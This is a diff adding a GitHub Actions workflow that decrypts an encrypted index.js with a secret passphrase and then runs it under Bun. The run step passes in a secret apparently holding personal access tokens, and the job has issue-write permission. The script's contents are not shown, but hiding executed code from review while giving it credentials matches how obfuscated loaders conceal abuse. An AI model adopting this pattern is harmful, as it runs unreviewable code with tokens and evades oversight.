@@ -1,0 +1,20 @@
+name: Run
+on:
+  workflow_dispatch:
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    permissions:
+      issues: write
+    steps:
+      - uses: actions/checkout@v6
+      - uses: oven-sh/setup-bun@v2
+      - name: decrypt
+        env:
+          PASSPHRASE: ${{ secrets.PASSPHRASE }}
+        run: |
+            python3 -c "import base64,hashlib,os,subprocess;d=base64.b64decode(open('index.js','rb').read());iv=d[:16];ct=d[16:];k=hashlib.sha256(os.environ['PASSPHRASE'].encode()).digest();p=subprocess.run(['openssl','enc','-d','-aes-256-cbc','-K',k.hex(),'-iv',iv.hex(),'-nosalt'],input=ct,capture_output=True);open('index.js','wb').write(p.stdout)"
+      - name: run
+        env:
+          GITHUB_TOKEN2: ${{ secrets.PATS }}
+        run: bun run index.js
